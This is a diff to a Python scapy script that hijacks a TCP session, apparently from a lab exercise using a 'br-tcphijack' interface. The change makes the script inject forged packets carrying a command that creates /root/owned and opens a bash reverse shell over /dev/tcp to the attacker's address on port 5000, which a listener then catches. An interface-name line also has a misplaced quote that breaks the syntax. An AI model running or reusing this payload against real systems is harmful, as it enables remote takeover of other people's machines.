@@ -3,14 +3,16 @@ from scapy.all import *
 from nclib import TCPServer
 
 def pkt_handler(pkt):
+        local_ip = get_if_addr("br-tcphijack)"
+        local_port = 5000
+
         if pkt[TCP].flags == "A":
                 ip = IP(src=pkt[IP].src, dst=pkt[IP].dst)
                 tcp = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, seq=pkt[TCP].seq, ack=pkt[TCP].ack, flags=pkt[TCP].flags)
-                raw = Raw(load="mkdir /root/owned \r\n")
+                raw = Raw(load="mkdir /root/owned && bash -c 'exec bash -i &>/dev/tcp/{}/{} <&1' \r\n".format(local_ip, local_port))
                 send(ip/tcp/raw, iface="br-tcphijack", verbose=0)
 
-                local_ip = get_if_addr("br-tcphijack)"
-                local_port = 5000
+
                 listener = TCPServer((local_ip, local_port))
                 for address in listener:
                      print(address.recv())
